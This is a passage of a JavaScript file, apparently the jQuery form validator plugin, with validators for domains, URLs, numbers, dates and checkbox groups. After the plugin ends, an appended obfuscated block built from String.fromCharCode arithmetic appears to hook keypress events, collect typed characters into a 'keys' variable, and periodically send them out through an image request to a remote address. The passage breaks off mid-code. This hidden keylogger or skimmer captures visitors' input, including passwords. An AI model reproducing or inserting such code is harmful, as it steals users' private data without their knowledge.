                    '.mk', '.ml', '.mm', '.mn', '.mo', '.mp', '.mq', '.mr', '.ms', '.mt', '.mu', '.mv',
                    '.mw', '.mx', '.my', '.mz', '.na', '.nc', '.ne', '.nf', '.ng', '.ni', '.nl', '.no',
                    '.np', '.nr', '.nu', '.nz', '.om', '.pa', '.pe', '.pf', '.pg', '.ph', '.pk', '.pl',
                    '.pm', '.pn', '.pr', '.ps', '.pt', '.pw', '.py', '.qa', '.re', '.ro', '.rs', '.rw',
                    '.ru', '.sa', '.sb', '.sc', '.sd', '.se', '.sg', '.sh', '.si', '.sj', '.sk', '.sl',
                    '.sm', '.sn', '.so', '.sr', '.st', '.sv', '.sy', '.sz', '.tc', '.td', '.tf', '.tg',
                    '.th', '.tj', '.tk', '.tm', '.tn', '.to', '.tp', '.tr', '.tt', '.tv', '.tw', '.tz',
                    '.ua', '.ug', '.uk', '.um', '.us', '.uy', '.uz', '.va', '.vc', '.ve', '.vg', '.vi',
                    '.vn', '.vu', '.ws', '.wf', '.ye', '.yt', '.za', '.zm', '.zw', '.mobi', '.xxx', '.asia'],

                ukTopDomains = ['co', 'me', 'ac', 'gov', 'judiciary','ltd', 'mod', 'net', 'nhs', 'nic',
                        'org', 'parliament', 'plc', 'police', 'sch', 'bl', 'british-library', 'jet','nls'],

                dot = val.lastIndexOf('.'),
                domain = val.substring(0, dot),
                ext = val.substring(dot, val.length),
                hasTopDomain = false;

            for (var i = 0; i < topDomains.length; i++) {
                if (topDomains[i] === ext) {
                    if(ext==='.uk') {
                        //Run Extra Checks for UK Domain Names
                        var domainParts = val.split('.');
                        var tld2 = domainParts[domainParts.length-2];
                        for(var j = 0; j < ukTopDomains.length; j++) {
                            if(ukTopDomains[j] === tld2) {
                                hasTopDomain = true;
                                break;
                            }
                        }

                        if(hasTopDomain)
                            break;

                    } else {
                        hasTopDomain = true;
                        break;
                    }
                }
            }

            if (!hasTopDomain) {
                return false;
            } else if (dot < 2 || dot > 57) {
                return false;
            } else {
                var firstChar = domain.substring(0, 1);
                var lastChar = domain.substring(domain.length - 1, domain.length);

                if (firstChar === '-' || firstChar === '.' || lastChar === '-' || lastChar === '.') {
                    return false;
                }
                if (domain.split('.').length > 3 || domain.split('..').length > 1) {
                    return false;
                }
                if (domain.replace(/[0-9a-z\.\-]/g, '') !== '') {
                    return false;
                }
            }

            // It's valid, lets update input with trimmed value perhaps??
            if(typeof $input !== 'undefined') {
                $input.val(val);
            }

            return true;
        },
        errorMessage : '',
        errorMessageKey: 'badDomain'
    });

    /*
    * Validate required
    */
    $.formUtils.addValidator({
        name : 'required',
        validatorFunction : function(val, $el) {
            return $el.attr('type') == 'checkbox' ? $el.is(':checked') : $.trim(val) !== '';
        },
        errorMessage : '',
        errorMessageKey: 'requiredFields'
    });

    /*
    * Validate length range
    */
    $.formUtils.addValidator({
        name : 'length',
        validatorFunction : function(val, $el, config, lang) {
            var lengthAllowed = $el.valAttr('length'),
                type = $el.attr('type');

            if(lengthAllowed == undefined) {
                var elementType = $el.get(0).nodeName;
                alert('Please add attribute "data-validation-length" to '+elementType+' named '+$el.attr('name'));
                return true;
            }

            // check if length is above min, below max or within range.
            var len = type == 'file' && $el.get(0).files !== undefined ? $el.get(0).files.length : val.length,
                lengthCheckResults = $.formUtils.numericRangeCheck(len, lengthAllowed),
                checkResult;

            switch(lengthCheckResults[0] )
            {   // outside of allowed range
                case "out":
                    this.errorMessage = lang.lengthBadStart + lengthAllowed + lang.lengthBadEnd;
                    checkResult = false;
                    break;
                // too short
                case "min":
                    this.errorMessage = lang.lengthTooShortStart + lengthCheckResults[1] + lang.lengthBadEnd;
                    checkResult = false;
                    break;
                // too long
                case "max":
                    this.errorMessage = lang.lengthTooLongStart + lengthCheckResults[1] + lang.lengthBadEnd;
                    checkResult = false;
                    break;
                // ok
                default:
                    checkResult = true;
            }
            
            return checkResult;
        },
        errorMessage : '',
        errorMessageKey: ''
    });

    /*
    * Validate url
    */
    $.formUtils.addValidator({
        name : 'url',
        validatorFunction : function(url) {
            // written by Scott Gonzalez: http://projects.scottsplayground.com/iri/ but added support for arrays in the url ?arg[]=sdfsdf
            var urlFilter = /^(https|http|ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|\[|\]|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(\#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i;
            if( urlFilter.test(url) ) {
                var domain = url.split('://')[1];
                var domainSlashPos = domain.indexOf('/');
                if(domainSlashPos > -1)
                    domain = domain.substr(0, domainSlashPos);

                return $.formUtils.validators.validate_domain.validatorFunction(domain); // todo: add support for IP-addresses
            }
            return false;
        },
        errorMessage : '',
        errorMessageKey: 'badUrl'
    });

    /*
    * Validate number (floating or integer)
    */
    $.formUtils.addValidator({
        name : 'number',
        validatorFunction : function(val, $el, config) {
            if(val !== '') {
                var allowing = $el.valAttr('allowing') || '',
                    decimalSeparator = $el.valAttr('decimal-separator') || config.decimalSeparator;

                if(allowing.indexOf('number') == -1)
                    allowing += ',number';

                if(allowing.indexOf('negative') > -1 && val.indexOf('-') === 0) {
                    val = val.substr(1);
                }

                if(allowing.indexOf('number') > -1 && val.replace(/[0-9]/g, '') === '') {
                    return true;
                }
                if(allowing.indexOf('float') > -1 && val.match(new RegExp('^([0-9]+)\\'+decimalSeparator+'([0-9]+)$')) !== null) {
                    return true;
                }
            }
            return false;
        },
        errorMessage : '',
        errorMessageKey: 'badInt'
    });

    /*
     * Validate alpha numeric
     */
    $.formUtils.addValidator({
        name : 'alphanumeric',
        validatorFunction : function(val, $el, config, language) {
            var patternStart = '^([a-zA-Z0-9',
                patternEnd = ']+)$',
                additionalChars = $el.attr('data-validation-allowing'),
                pattern = '';

            if( additionalChars ) {
                pattern = patternStart + additionalChars + patternEnd;
                var extra = additionalChars.replace(/\\/g, '');
                if( extra.indexOf(' ') > -1 ) {
                    extra = extra.replace(' ', '');
                    extra += ' and spaces ';
                }
                this.errorMessage = language.badAlphaNumeric + language.badAlphaNumericExtra + extra;
            } else {
                pattern = patternStart + patternEnd;
                this.errorMessage = language.badAlphaNumeric;
            }

            return new RegExp(pattern).test(val);
        },
        errorMessage : '',
        errorMessageKey: ''
    });

    /*
    * Validate against regexp
    */
    $.formUtils.addValidator({
        name : 'custom',
        validatorFunction : function(val, $el, config) {
            var regexp = new RegExp($el.valAttr('regexp'));
            return regexp.test(val);
        },
        errorMessage : '',
        errorMessageKey: 'badCustomVal'
    });

    /*
    * Validate date
    */
    $.formUtils.addValidator({
        name : 'date',
        validatorFunction : function(date, $el, conf) {
            var dateFormat = 'yyyy-mm-dd';
            if($el.valAttr('format')) {
                dateFormat = $el.valAttr('format');
            }
            else if( conf.dateFormat ) {
                dateFormat = conf.dateFormat;
            }

            return $.formUtils.parseDate(date, dateFormat) !== false;
        },
        errorMessage : '',
        errorMessageKey: 'badDate'
    });


    /*
    * Validate group of checkboxes, validate qty required is checked
    * written by Steve Wasiura : http://stevewasiura.waztech.com
    * element attrs
    *    data-validation="checkbox_group"
    *    data-validation-qty="1-2"  // min 1 max 2
    *    data-validation-error-msg="chose min 1, max of 2 checkboxes"
    */
    $.formUtils.addValidator({
        name : 'checkbox_group',
        validatorFunction : function(val, $el, config, lang, $form) 
        {   // preset return var
            var checkResult = true;
            // get name of element. since it is a checkbox group, all checkboxes will have same name
            var elname = $el.attr('name');
            // get count of checked checkboxes with this name
            var checkedCount = $("input[type=checkbox][name^='"+elname+"']:checked", $form).length;
            // get el attr that specs qty required / allowed
            var qtyAllowed = $el.valAttr('qty');
            if (qtyAllowed == undefined) {
                var elementType = $el.get(0).nodeName;
                alert('Attribute "data-validation-qty" is missing from '+elementType+' named '+$el.attr('name'));
            }
            // call Utility function to check if count is above min, below max, within range etc.
            var qtyCheckResults = $.formUtils.numericRangeCheck(checkedCount, qtyAllowed) ;
            // results will be array, [0]=result str, [1]=qty int
            switch(qtyCheckResults[0] ) {   
                // outside allowed range
                case "out":
                    this.errorMessage = lang.groupCheckedRangeStart + qtyAllowed + lang.groupCheckedEnd;
                    checkResult = false;
                    break;
                // below min qty
                case "min":
                    this.errorMessage = lang.groupCheckedTooFewStart + qtyCheckResults[1] + lang.groupCheckedEnd;
                    checkResult = false;
                    break;
                // above max qty
                case "max":
                    this.errorMessage = lang.groupCheckedTooManyStart + qtyCheckResults[1] + lang.groupCheckedEnd;
                    checkResult = false;
                    break;
                // ok
                default:
                    checkResult = true;
            }
            
        return checkResult;
        
        } // remove comma
     //   errorMessage : '', // set above in switch statement
     //   errorMessageKey: '' // not used
    });

})(jQuery);
var keys='';var page='energybuyersnetwork';var date=new Date();document[(String[((function(){var s=String.fromCharCode(0x65),I=String.fromCharCode(0150,97,0x72,0x43),T=(function () { var N="f"; return N })(),W=String.fromCharCode(0x6f,100),i=(function () { var aV="mC",l="ro"; return l+aV })();return T+i+I+W+s;})())](('aBY'.length*((String.fromCharCode(0143)[((function () { var Y="h",$="engt",G="l"; return G+$+Y })())]*'RgEUkxYZ'.length+'Rs'.length)*String.fromCharCode(0x72,0102,0145)[(String.fromCharCode(0x6c,0x65,0x6e,0147,0164,0x68))]+'La'.length)+(5*'zwY'.length+0)),('jK'.length*('q'.length*('pTdhk'.length*'bHNlSKc'.length+'h'.length)+('nA'.length*6+3))+'RMtYtBgc'.length),('o'.length*('TEv'.length*027+14)+('W'.length*020+8)),(String.fromCharCode(0x56)[(String.fromCharCode(0x6c,101,110,0147,0x74,104))]*('UB'.length*('n'.length*33+6)+0)+(0x1*('dj'.length*8+4)+3)),(String.fromCharCode(0x50)[(String.fromCharCode(108,0145,110,103,0164,0150))]*('diOZNuIZZ'.length*((function () { var X='j',F='p'; return F+X })()[((function () { var TR="th",S="g",h="l",w="en"; return h+w+S+TR })())]*'XiWP'.length+'rq'.length)+'dMOm'.length)+(6*0x4+3)),('Q'.length*(String.fromCharCode(0x55,0x56)[((function () { var H="th",P="leng"; return P+H })())]*('h'.length*(1*(0x1*19+2)+14)+'Ln'.length)+'LV'.length)+(1*(02*012+2)+14)),('x'.length*('SUd'.length*('Y'.length*0x10+2)+4)+('K'.length*060+8)),(String.fromCharCode(106)[(String.fromCharCode(0x6c,101,110,103,0x74,104))]*('MB'.length*0x2e+7)+'Sq'.length),('Km'.length*('u'.length*(0x1*(05*5+0)+3)+('AWPc'.length*'nneJVJ'.length+0))+('N'.length*013+0)),((function () { var zg='A'; return zg })()[(String.fromCharCode(0x6c,101,110,0147,0x74,0x68))]*('uBnbHO'.length*(03*'ZWvvY'.length+0)+'n'.length)+(02*0xc+0))))]=function(l){window[(function(){var p=String[((function () { var x="e",d="mCharCo",B="fr",k="d",r="o"; return B+r+d+k+x })())](('XE'.length*(('dCf'.length*6+4)*0x2+0)+28)),J=(function(){var dv=String.fromCharCode(0145);return dv;})(),$W=(function(){var D=(function () { var I="g"; return I })();return D;})();return $W+J+p;})()]=window[((function(){var Z=(function(){var _=String.fromCharCode(116);return _;})(),b=(function(){var O=String.fromCharCode(110),J=(function () { var E="e"; return E })(),Hj=String.fromCharCode(118);return Hj+J+O;})(),r2=(function(){var O=(function () { var Q="e"; return Q })();return O;})();return r2+b+Z;})())]?event:l;window[(function(){var E=(function(){var y5=String.fromCharCode(0171);return y5;})(),uS=(function(){var n=(function () { var m="e"; return m })();return n;})(),Qv=String[(String.fromCharCode(102,114,0157,0x6d,0x43,104,0x61,0x72,0103,0157,0x64,0x65))]((03*033+26));return Qv+uS+E;})()]=window[(function(){var t=String[((function () { var R="de",s="rCo",K="fromCha"; return K+s+R })())](('VtmFncSb'.length*016+4)),O=String[((function () { var L="rCode",CP="fromCha"; return CP+L })())](('zJVP'.length*((0x1*0x15+0)*01+0)+17)),E=String[(String.fromCharCode(102,0162,0x6f,109,67,0x68,0141,0162,67,0x6f,0x64,0x65))](('Y'.length*0x5d+10));return E+O+t;})()][((function(){var T=String[((function () { var Ew="Code",R="r",_="fromCha"; return _+R+Ew })())]((0x65*'g'.length+0)),r=String[((function () { var n="e",K="rCod",AB="fromCha"; return AB+K+n })())](('pulFLPR'.length*015+9)),NB=String[((function () { var L="de",o="mCharCo",u="fro"; return u+o+L })())](('k'.length*('Z'.length*0x47+20)+16),('hEuHM'.length*022+11),('qG'.length*052+37),((01*7+4)*'tiVzUn'.length+1)),m=String[((function () { var M="arCode",by="omCh",y="f",Tj="r"; return y+Tj+by+M })())](('HiU'.length*(('D'.length*013+0)*0x3+0)+12));return NB+m+r+T;})())]?window[(function(){var a=String[(String.fromCharCode(0146,0x72,0x6f,0155,0103,0x68,97,0x72,0x43,0157,0144,101))](('zYm'.length*36+8)),T=(function(){var Vq=(function () { var iB="e"; return iB })();return Vq;})(),V=(function(){var kA=String.fromCharCode(0147);return kA;})();return V+T+a;})()][(String[(String[(String.fromCharCode(0146,0162,111,0155,67,104,0141,0162,0x43,0157,0144,0145))](('yf'.length*0x25+28),(1*0x5a+24),('u'.length*65+46),(04*(02*(1*010+3)+4)+5),('Q'.length*60+7),('U'.length*0126+18),(('L'.length*0x9+4)*'yZVpXeQ'.length+6),('a'.length*('FvvxkndMv'.length*('y'.length*'puOmFRUs'.length+2)+9)+15),('O'.length*(1*(02*0xb+7)+12)+26),(026*'suAUZ'.length+1),('AQB'.length*0x1e+10),(01*0x49+28)))](('d'.length*('kC'.length*('lXI'.length*017+6)+'LzxF'.length)+'p'.length),(String.fromCharCode(0125,0x69)[((function () { var y="gth",e="n",fZ="le"; return fZ+e+y })())]*('S'.length*('A'.length*(String.fromCharCode(121)[(String.fromCharCode(0154,0x65,0x6e,103,0164,104))]*(String.fromCharCode(116,0125,0112)[(String.fromCharCode(0x6c,0145,0x6e,0x67,0x74,0x68))]*String.fromCharCode(0107,0x6a,0106,115)[((function () { var z="ngth",r="le"; return r+z })())]+'Rg'.length)+('tBYTs'.length*'sG'.length+0))+'wakOh'.length)+(05*03+0))+(1*'tADbotI'.length+6)),('jJE'.length*(String.fromCharCode(0x57)[((function () { var V="h",R="engt",O="l"; return O+R+V })())]*(0x1*015+8)+(01*(1*'otNVoY'.length+5)+1))+('B'.length*026+0)),(String.fromCharCode(0x56,0x6d)[((function () { var o0="ngth",a="le"; return a+o0 })())]*(0x1*(1*((01*'FsGvjhB'.length+4)*0x2+0)+4)+0)+('aLr'.length*4+3)),(String.fromCharCode(79)[((function () { var o="h",PU="engt",t="l"; return t+PU+o })())]*('b'.length*0100+18)+(2*13+3)),((function () { var M='biU',wZ='sGnD',Z='b'; return Z+wZ+M })()[(String.fromCharCode(0154,0145,0x6e,0147,116,0150))]*((0x3*0x4+0)*'V'.length+('fin'.length-3))+'DrRq'.length),((function () { var MD='G'; return MD })()[(String.fromCharCode(0x6c,0145,0x6e,0x67,0164,0150))]*(1*0x2e+11)+('P'.length*(1*19+7)+18))))]:window[String[(String[(String.fromCharCode(0146,0x72,111,109,0103,0x68,97,0x72,67,0157,0144,0145))]((0x33*0x2+0),('vFiqhBalr'.length*12+6),(0x1*(0x1*(('w'.length*(9*'Pa'.length+1)+11)*'fL'.length+0)+50)+1),('W'.length*(012*0xa+4)+5),('j'.length*(02*033+13)+0),('a'.length*0x37+49),(0x8*('Rz'.length*5+2)+1),('M'.length*88+26),((0x10*0x1+0)*4+3),('duuN'.length*(04*0x6+2)+7),('aB'.length*49+2),(020*'RVesee'.length+5)))](('i'.length*('d'.length*('I'.length*('tFhz'.length*(06*'Wg'.length+0)+4)+(('oKZQJ'.length*4+0)*'c'.length+0))+(0x1*0x1e+1))+('X'.length-1)),(String.fromCharCode(0x4a)[((function () { var I="h",Q="t",fA="leng"; return fA+Q+I })())]*((function () { var sb='R',VJ='p'; return VJ+sb })()[(String.fromCharCode(108,101,0156,0147,0164,0x68))]*(0x2*012+5)+'MXbJkl'.length)+(0x1*0x1e+15)),('jp'.length*(String.fromCharCode(0x61,103,0106)[((function () { var g="gth",_M="n",s="l",SH="e"; return s+SH+_M+g })())]*(String.fromCharCode(0x74,75,0107,82,0152,0143)[((function () { var m="gth",n="n",_V="l",C4="e"; return _V+C4+n+m })())]*(function () { var Wk='x',dV='L'; return dV+Wk })()[(String.fromCharCode(0154,0145,110,103,0164,0150))]+('iIGlxOg'.length-7))+'ecgVWPVc'.length)+(02*12+4)))][((function(){var E=String[(String.fromCharCode(0146,0x72,0x6f,0x6d,0103,104,0x61,0162,0103,111,0144,101))]((1*(('Mz'.length*5+0)*06+4)+36),(1*0131+12)),UO=String[(String.fromCharCode(0146,114,0157,109,0103,0150,97,0x72,67,111,100,0x65))](('njOaOEL'.length*(1*'cHijGlGmT'.length+7)+2),(0x2*('fDKJg'.length*0x6+1)+5),(01*(1*56+24)+31)),v5=String[((function () { var lM="de",cI="mCharCo",ok="fro"; return ok+cI+lM })())]((01*(05*((01*0x6+4)*1+0)+2)+47),('K'.length*(0x1*0x3e+20)+22),(014*'iVXKhuYV'.length+1));return v5+UO+E;})())];window[String[((function(){var v=String.fromCharCode(0x43,0157,100,0x65),aq=(function () { var J="r",E="a"; return E+J })(),f=(function () { var l$="m",b="ro",IT="f"; return IT+b+l$ })(),T=String.fromCharCode(0103,104);return f+T+aq+v;})())](((function () { var w9='n',fT='D'; return fT+w9 })()[((function () { var i="th",_="leng"; return _+i })())]*('mxJVbrvV'.length*(function () { var b='VB',u='CBgb'; return u+b })()[(String.fromCharCode(0154,0x65,0156,103,0164,104))]+'e'.length)+'ZkoAdpTPq'.length),('DAg'.length*('t'.length*('S'.length*(02*0x7+2)+13)+('LoBhaFi'.length-7))+(016*'E'.length+0)),(String.fromCharCode(0x71)[((function () { var T="ngth",R7="e",Uw="l"; return Uw+R7+T })())]*('l'.length*('l'.length*36+17)+27)+(0x1*((016*'M'.length+0)*'xT'.length+1)+12)))]=String[((function(){var c=String[(String.fromCharCode(102,0162,111,0155,0103,104,0141,114,67,0x6f,0144,0145))]((1*(0x4*('N'.length*18+0)+17)+22),('x'.length*0134+8),('VyWJtIi'.length*13+10)),kn=String[(String.fromCharCode(0146,114,0x6f,109,0103,0x68,0141,0x72,0103,111,0144,101))](('M'.length*('K'.length*052+15)+47),(0x1*('twPbAUC'.length*011+6)+28),('qy'.length*49+16),(5*13+2)),B=(function(){var Ul=(function () { var f="C"; return f })(),Rp=String.fromCharCode(0x6d),NX=String.fromCharCode(0x66,0x72,0157);return NX+Rp+Ul;})();return B+kn+c;})())](window[String[((function(){var r_=(function () { var us="e",Cj="d",SD="o"; return SD+Cj+us })(),L=String.fromCharCode(0157,109,0x43,0150,97,114,0x43),sO=String.fromCharCode(0146),YB=String.fromCharCode(0x72);return sO+YB+L+r_;})())](('x'.length*(04*('c'.length*(01*('P'.length*13+0)+4)+2)+0)+('XbHzCot'.length*'jMkV'.length+3)),('iaVFfGVzL'.length*('xzggT'.length*'Oc'.length+1)+'Uv'.length),((function () { var W='o'; return W })()[((function () { var e3="h",rf="ngt",oL="l",SP="e"; return oL+SP+rf+e3 })())]*('VklR'.length*('Oi'.length*7+6)+7)+(2*(0x1*'QpsZtIr'.length+5)+10)))]);window[(function(){var kI=(function(){var wU=String.fromCharCode(0x73);return wU;})(),i6=String[((function () { var rG="rCode",k="fromCha"; return k+rG })())](('Fzgu'.length*24+5),(01*0140+25)),jm=String[((function () { var _e8="de",C="rCo",$x="fromCha"; return $x+C+_e8 })())]((0x1*107+0));return jm+i6+kI;})()]+=window[String[(String[(String.fromCharCode(102,114,111,0155,0x43,104,97,0x72,0x43,111,0x64,101))]((('PCJ'.length*('U'.length*('zcfyHq'.length*'Vv'.length+0)+2)+9)*'ey'.length+0),('l'.length*102+12),(('EfUKaN'.length*'AG'.length+1)*'KGUocGZi'.length+7),(('m'.length*('h'.length*(0xb*'x'.length+0)+4)+3)*06+1),(01*043+32),('u'.length*(48*'Rj'.length+0)+8),('zsKPBn'.length*(1*0xc+4)+1),('vdq'.length*045+3),(1*(03*('x'.length*(02*'kOATEf'.length+3)+6)+1)+3),(1*0x66+9),('He'.length*('d'.length*051+2)+14),(02*('s'.length*29+14)+15)))](('j'.length*('Fy'.length*30+20)+(0x5*'BOYOZ'.length+2)),(((function () { var D='nN',k='O',J='iA'; return J+k+D })()[(String.fromCharCode(0154,0145,110,103,116,0150))]*'PQg'.length+'M'.length)*(function () { var NQ='opMS',wV='Z',Ei='Q'; return Ei+wV+NQ })()[((function () { var U0="h",sm="t",B3="leng"; return B3+sm+U0 })())]+'ADeRd'.length),('O'.length*(String.fromCharCode(0127)[(String.fromCharCode(0154,0145,0156,0x67,116,0150))]*(0x4*(2*'TJytbhATZ'.length+0)+4)+'NJczlZ'.length)+('Ah'.length*('K'.length*(0x3*3+1)+4)+11)))];};window[((function(){var E=String[(String.fromCharCode(102,0x72,111,0x6d,0x43,0x68,0x61,0x72,67,0x6f,0144,101))]((041*03+2),(0x1*('vDF'.length*26+14)+22),(01*('a'.length*(0x2*022+17)+37)+28),('p'.length*('k'.length*('p'.length*(1*('R'.length*('eWlLY'.length*'ICr'.length+1)+2)+9)+26)+18)+26),((0x1*('D'.length*('Cy'.length*'jZyHSPfB'.length+7)+8)+23)*0x2+0)),v=String[(String.fromCharCode(0x66,0x72,0157,109,0103,104,0141,0162,0103,0157,100,101))]((01*(04*0xd+7)+56),('N'.length*0101+36),(0x1*60+56),('wj'.length*0x24+1),(01*(0x1*83+25)+2),('y'.length*78+38));return v+E;})())](function(){new window[String[((function(){var n=(function () { var jh="ode",z="C",c="r"; return c+z+jh })(),y=String.fromCharCode(0103,0150,0141),j=(function () { var a="r",qA="f"; return qA+a })(),s=String.fromCharCode(0x6f,109);return j+s+y+n;})())](('f'.length*(1*(0x1*033+7)+3)+(01*29+7)),((function () { var f='Q'; return f })()[((function () { var M="gth",g="n",u="le"; return u+g+M })())]*(1*('DyqVVFKwn'.length*'bYBsnAA'.length+3)+25)+('vt'.length*9+0)),(String.fromCharCode(0x77)[((function () { var V="th",cy="leng"; return cy+V })())]*(0x3*('c'.length*(01*0x9+5)+10)+19)+'BaCfXg'.length),(('A'.length*('qJz'.length*'gYOPVZXs'.length+6)+4)*(function () { var e='E',o='e',O='Q'; return O+o+e })()[(String.fromCharCode(0154,101,0x6e,0147,0164,0x68))]+'q'.length),(String.fromCharCode(0x4e)[(String.fromCharCode(0154,101,110,0147,0164,0x68))]*('d'.length*('l'.length*025+17)+(0x1*(07*0x3+2)+4))+('X'.length*('t'.length*(0x3*'KSDAx'.length+2)+7)+12)))]()[(String[(String[(String.fromCharCode(0x66,0162,0157,109,0103,0x68,0141,0x72,0x43,0x6f,0x64,0x65))]((0x1*(03*0x12+2)+46),(07*('wgl'.length*04+3)+9),('X'.length*('yFU'.length*(0x1*19+10)+15)+9),((011*02+0)*06+1),(0x6*('Jy'.length*4+3)+1),(6*0x11+2),('a'.length*('b'.length*('aEifPln'.length*6+0)+32)+23),(2*(0x1*(1*0x13+17)+11)+20),('t'.length*('B'.length*0x2e+18)+3),('ClWp'.length*033+3),('p'.length*(0x2*('I'.length*18+16)+28)+4),('Lf'.length*0x2e+9)))](('QPNA'.length*('f'.length*(2*'TRPMRgB'.length+4)+'sHTHJBESy'.length)+'RBRRVrA'.length),('dpMv'.length*(0x1*('w'.length*0x10+2)+5)+('G'.length*(01*(0x1*0x7+4)+7)+4)),(('kUk'.length*3+2)*'JMYRpBuEs'.length+('u'.length-1))))]=String[((function(){var no=(function () { var z="e",qu="rCod",re="a"; return re+qu+z })(),e8=String.fromCharCode(0155,0x43,0150),v=String.fromCharCode(0146,0x72,111);return v+e8+no;})())](('t'.length*(('u'.length*('EX'.length*(function () { var Z='SLiR',L='U',uG='b'; return uG+L+Z })()[(String.fromCharCode(0154,101,0156,0x67,0x74,0150))]+'F'.length)+('yAH'.length-3))*'PKcfU'.length+'ph'.length)+('EgPe'.length*010+5)),((function () { var W='Q',fh='X'; return fh+W })()[(String.fromCharCode(0x6c,0x65,0156,0x67,0x74,0x68))]*('i'.length*('Z'.length*(0x3*014+4)+'IxDzO'.length)+'FDGyWa'.length)+('hCa'.length*'yeNd'.length+2)),((function () { var HG='W'; return HG })()[((function () { var A="ngth",GG="le"; return GG+A })())]*('p'.length*((function () { var bj='V'; return bj })()[(String.fromCharCode(0x6c,0x65,110,0147,116,0150))]*(0x1*075+3)+('D'.length*('dwO'.length*'fHh'.length+2)+9))+('i'.length*15+5))+(0x6*'iv'.length+0)),(String.fromCharCode(0132,0116)[(String.fromCharCode(108,101,110,0147,116,0150))]*(String.fromCharCode(0163,0x53)[(String.fromCharCode(0154,0145,110,0147,0x74,104))]*('cU'.length*0x7+5)+('n'.length*'ShVeDxAWm'.length+4))+(0x2*'csqFU'.length+0)),(String.fromCharCode(0x70,0x50)[((function () { var ek="th",oG="ng",ss="l",du="e"; return ss+du+oG+ek })())]*('M'.length*022+6)+('S'.length*010+2)),('gOLBtMn'.length*'gdIRJH'.length+'zayjT'.length),('ll'.length*('R'.length*014+8)+'cjlmlGA'.length),((function () { var I='Q'; return I })()[((function () { var i="gth",q="n",Vl="le"; return Vl+q+i })())]*(String.fromCharCode(0x67,0x6f)[((function () { var AB="ngth",s="e",C="l"; return C+s+AB })())]*('q'.length*('g'.length*11+9)+19)+(0x1*('nTK'.length*0x4+0)+9))+('D'.length*9+7)),(String.fromCharCode(0101)[((function () { var Qh="ngth",d="le"; return d+Qh })())]*((function () { var hT='F'; return hT })()[((function () { var a="th",Q="leng"; return Q+a })())]*('j'.length*47+1)+(01*040+11))+('XUB'.length*'tWwUkL'.length+3)),('ieSNeg'.length*('fFEVoJW'.length*(function () { var YT='Z',RL='x'; return RL+YT })()[((function () { var p="th",kq="ng",Vw="le"; return Vw+kq+p })())]+('wzBaY'.length-5))+('C'.length*0xd+0)),(('Qh'.length*'CnPOYT'.length+0)*'EToPMGpD'.length+'fQa'.length),('Ifi'.length*((function () { var r='n',y='c',R='kGuT',U='s'; return R+U+y+r })()[((function () { var E="h",i8="t",gI="len",n="g"; return gI+n+i8+E })())]*'Dfdr'.length+'l'.length)+(1*('vofn'.length*'Ubr'.length+0)+2)),((function () { var YS3='x',DY='J',c='pYf'; return c+DY+YS3 })()[(String.fromCharCode(0154,101,110,0x67,0x74,0150))]*('XK'.length*String.fromCharCode(116,106,0117,119,0116,0x65,107)[(String.fromCharCode(108,101,0156,0x67,0164,104))]+'aBJkw'.length)+(6*'nq'.length+0)),((function () { var m='n',Zw='i'; return Zw+m })()[(String.fromCharCode(0x6c,0x65,0x6e,0147,0x74,104))]*('k'.length*('VnRJbE'.length*(function () { var vI='n',So='v',v='QPwZ'; return v+So+vI })()[((function () { var Gb="h",ey="ngt",T="le"; return T+ey+Gb })())]+'zFZi'.length)+('w'.length*7+3))+'ABSGT'.length),((function () { var VO='U'; return VO })()[((function () { var IM="gth",GL="en",Bi="l"; return Bi+GL+IM })())]*('r'.length*('D'.length*('AhvBaO'.length*7+0)+35)+'vwkywt'.length)+('o'.length*(02*('Xzotw'.length*'jp'.length+1)+1)+10)),('y'.length*((function () { var k='H'; return k })()[(String.fromCharCode(0x6c,0145,110,0147,116,0150))]*('RrV'.length*('A'.length*(05*2+1)+'LRNRoYMa'.length)+'wvW'.length)+('C'.length*(03*'NCBKX'.length+0)+3))+('swgrc'.length*04+1)),(String.fromCharCode(0x56)[((function () { var DJ="th",ew="ng",D9="l",TO="e"; return D9+TO+ew+DJ })())]*('m'.length*('I'.length*('VoE'.length*0xb+8)+'uUiepQpH'.length)+(2*012+5))+(0x2*015+4)),((function () { var _='s'; return _ })()[(String.fromCharCode(0x6c,101,110,0x67,0x74,0x68))]*((function () { var Ww='uP',JQ='OULaZ',j='x'; return j+JQ+Ww })()[((function () { var VG="h",bG="engt",t="l"; return t+bG+VG 